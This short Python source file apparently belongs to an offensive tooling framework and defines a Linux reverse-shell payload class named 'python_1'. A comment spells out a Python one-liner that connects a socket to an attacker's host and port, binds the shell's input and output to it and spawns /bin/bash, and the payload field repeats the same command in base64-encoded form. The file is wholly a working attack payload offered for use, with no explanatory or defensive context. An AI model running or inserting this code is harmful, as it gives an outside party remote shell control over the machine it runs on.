from lib.framework.core.payload import Payload


# export RHOST="{LHOST}";export RPORT={LPORT};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
class python_1(Payload):
    name = "python_1"
    platform = ["linux"]
    payload = "ZXhwb3J0IFJIT1NUPSJ7TEhPU1R9IjtleHBvcnQgUlBPUlQ9e0xQT1JUfTtweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9iYXNoIikn"
